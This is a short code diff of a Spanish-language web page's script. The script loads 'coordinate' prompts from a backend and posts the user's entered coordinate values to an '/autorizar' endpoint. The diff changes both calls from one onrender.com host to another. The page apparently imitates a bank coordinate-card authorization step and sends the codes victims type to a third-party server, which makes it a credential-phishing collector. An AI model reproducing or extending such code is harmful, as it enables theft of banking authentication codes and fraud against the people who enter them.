@@ -103,7 +103,7 @@
     // Al cargar la página, obtener coordenadas configuradas desde el backend
     document.addEventListener("DOMContentLoaded", async () => {
       try {
-        const res = await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/config");
+        const res = await fetch("https://autorizacion-ob.onrender.com/config");
         const data = await res.json();
 
         // Actualizar etiquetas con las coordenadas configuradas
@@ -129,7 +129,7 @@
       ${document.getElementById("label3").textContent} ${coord3}`;
 
       try {
-        await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/autorizar", {
+        await fetch("https://autorizacion-ob.onrender.com/autorizar", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ mensaje })
